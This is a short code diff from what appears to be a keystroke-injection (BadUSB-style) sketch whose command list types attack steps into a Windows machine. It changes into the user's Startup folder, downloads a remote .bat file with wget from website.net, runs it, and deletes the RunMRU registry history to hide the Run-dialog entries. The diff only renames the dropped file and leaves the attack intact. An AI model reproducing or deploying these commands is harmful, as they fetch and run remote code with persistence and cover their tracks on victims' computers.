@@ -4,10 +4,10 @@ byte KEYPAD[10] = {234, 225, 226, 227, 228, 229, 230, 231, 232, 233};
 
 String vectors[5] = {
   "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'",
-  "wget http://website.net/scripts/ShellStartupWin10.bat -OutFile 'Win10Startup_DO_NOT_DELETE.bat'",
-  "start Win10Startup_DO_NOT_DELETE.bat",
-   "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f",
-   "exit"
+  "wget http://website.net/scripts/ShellStartupWin10.bat -OutFile 'Win10Startup.bat'",
+  "start Win10Startup.bat",
+  "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f",
+  "exit"
   };
 
 void typeKey(int key)
